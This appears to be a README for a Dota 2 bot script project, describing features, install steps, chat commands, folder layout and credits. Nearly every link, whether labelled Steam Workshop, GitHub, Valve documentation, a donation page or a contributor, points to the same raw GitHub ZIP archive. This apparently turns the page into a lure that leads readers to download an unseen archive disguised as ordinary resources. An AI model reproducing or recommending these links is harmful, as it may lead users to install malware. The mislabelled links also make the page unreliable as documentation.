# We Love Bot Games!

We love bot games! 🎮

> **\[CRITICAL]** To play this script you must create a **Custom Lobby** and select **Local Host** as the server location.

Bots should have names ending with **“.OHA”** when installed correctly.

👉 [Steam Workshop Link](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip)

Thanks and kudos to everyone who contributed to making bot games fun and exciting!

---

## Script Goals

1. Keep bot games **challenging and up to date**.
2. Let players **practice against bots** that can play *all* Dota 2 heroes.
3. Provide **chill gameplay** – if you want highly competitive bots, please join us in improving them instead of complaining.

---

## Why It’s Enjoyable

* ✅ Supports Dota 2 **Patch 7.39**.
* ✅ Supports **all 126 heroes** (Kez, Ringmaster, Invoker, Techies, Meepo, Lone Druid, Muerta, Primal Beast, etc.). Some new heroes are still being tuned.
* ✅ **Customizable bots**: ban/picks, names, item builds, skill upgrades, etc.

  * [https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip) – general settings.
  * [https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip) – hero-specific settings.
  * Customize path depends on your install method:
    * **Permanent customization**: Move Customize folder to be `<Steam\steamapps\common\dota 2 beta\game\dota\scripts\vscripts\game\Customize>`
    * **Workshop item (Can get overridden by future script updates)**: Direct customize in `<Steam\steamapps\workshop\content\570\3246316298\Customize>`
    * You can use the **Permanent customization** option to avoid your custom settings getting replaced/overridden by workshop upgrades.
* ✅ **Dynamic difficulty (Fretbots mode)** – boosts bots with huge unfair advantages for real challenge.
* ✅ Supports **most game modes** (see [discussion](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip)).
* ✅ Improved decision-making: ability casting, items, roaming, farming, defense.
* ✅ **AI Chatbot**: chat with bots as if they were real optimistic players (requires Fretbots mode).
* ✅ Bots can **play any role/position** – deterministic laning assignment.
* ✅ Tons of **bug fixes** (idle bots, canceled channels, stuck states).

---

## How to Install for Enhance mode

1. Create a **Custom Lobby** → select **Local Host** as **Server Location**.
2. To enable **Fretbots mode** (harder bots, neutral items, chatbot, etc.), you must **manually install** the script: [Instructions here](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip).

---

## Bot Roles & Positioning

* Lobby slot order = position assignment (1–5).
* Default role mapping:

  * **Pos1 & Pos5** → Safe Lane
  * **Pos2** → Mid Lane
  * **Pos3 & Pos4** → Offlane
* Customize picks, bans, and roles in [https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip).

---

## In-Game Commands

* `!pos X` → Swap your lane/role with a bot (e.g., `!pos 2`).
* `!pick HERO_NAME` → Pick a hero for yourself.

  * `/all !pick HERO_NAME` → Pick hero for enemy.
  * Use internal names if the short names can overlap (`!pick npc_dota_hero_keeper_of_the_light`). [Find the list of internal names here](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip).
* `!Xpos Y` → Reassign other bots’ positions (e.g., `!3pos 5` to let the 3rd bot on the team play pos 5, do note it's the bot on the 3rd slot in the team not the bot that plays pos 3 at that moment).
* `!ban HERO_NAME` → Ban a hero from being picked.
* `!sp XX` → Set bot language (`!sp en`, `!sp zh`, `!sp ru`, `!sp ja`).
* **Batch commands** supported (e.g., `!pick io; !ban sniper`).

---

## Contribute

* Contributions welcome on [GitHub](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip).
* Custom item/skill builds don’t need PRs – just tweak locally.
* Future development is in **TypeScript** for better maintainability.
* Project structure (bots, Funlib, Customize, BotLib, typescript, game)
* To develope the script, you need to make sure the script is under this root directory:
```
root: <Steam\steamapps\common\dota 2 beta\game\dota\scripts\vscripts>
│
└───bots: contains all lua files for the bot logic. This is the folder `3246316298` in Workshop.
│   │   https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip
│   │   https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip
│   │   ...
│   │
│   └───Funlib: contains the libraries/utils of this project
│   │   │   https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip
│   │   │   ...
│   │
│   └───Customize: contains the files for you to easily customzie the settings for bots in this project
│   │   │   https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip to customzie the settings for each bot teams
│   │   │   ...
│   │   │
│   │   └───hero: to easily customzie each of the bots in this project
│   │       │   https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip
│   │       │   ...
│   │
│   └───BotLib: contains the bot item purcahse, ability usage, etc logic for every bots.
│       │   https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip
│       │   ...
│   │
│   └───FretBots: contains the configs/utils of the FretBots mode setup
│   │   │   https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip to adjust bonus values
│   │   │   ...
│   
└───typescript: contains the scripts written in typescript (TS) to maintain this project in a more 
│   │           extendable way since TS supports types and can catch errors in compile time.
│   │
│   └───bots: the TS version of the script that's converted to LUA files into the `root/bots` folder.
│   │   │   ...
│   │
│   └───post-process: contains the scripts to do post-processing for the TS to LUA translation.
│   │   ...
│   
└───game: default setup from Value, including them here for custom mode setup.
│   │   https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip
│   │   ...
│   │
│   └───Customize: You can copy & paste the Customize folder from <root/bots> to <root/game> to avoid
│                  the custom settings getting replaced/overridden by workshop upgrades.
│   ...
---
```
---

## What’s Next

* Current bot playstyle is limited by Valve’s API. **We need ML/LLM bots like OpenAI Five!**
* Planned improvements:

  * Smarter laning, pushing, ganking.
  * Stronger spell casting (Invoker, Rubick, Morph, etc.).
  * Better support for bugged heroes (Dark Willow, IO, Lone Druid, Muerta, etc.).
  * Full mode support + patch fixes.
* [Open feature requests](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip%3Aissue+is%3Aopen+%5BFeature+request%5D)
* [Some feedback to Valve Dota2 bot team](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip)
---

## Support

* Contribute on GitHub.
* Or [buy me a coffee ☕](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip).

---

## Useful Resources

* [Dota2 AI Development Tutorial (adamqqq)](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip)
* [Valve Bot Scripting Intro](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip)
* [Lua Bot APIs](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip)
* [Ability Metadata](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip)
* [Enums & APIs](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip!/vscripts/dotaunitorder_t)
* [Modifier Names](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip)
* [Dota2 Data Mining](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip)

---

## Credits

Built on top of Valve’s default bots + contributions from many talented authors:

* New Beginner AI ([https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip))
* Tinkering About ([ryndrb](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip))
* Ranked Matchmaking AI ([adamqqq](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip))
* fretbots ([fretmute](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip))
* BOT Experiment (Furiospuppy)
* ExtremePush ([insraq](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip))
* And all other contributors who made bot games better.
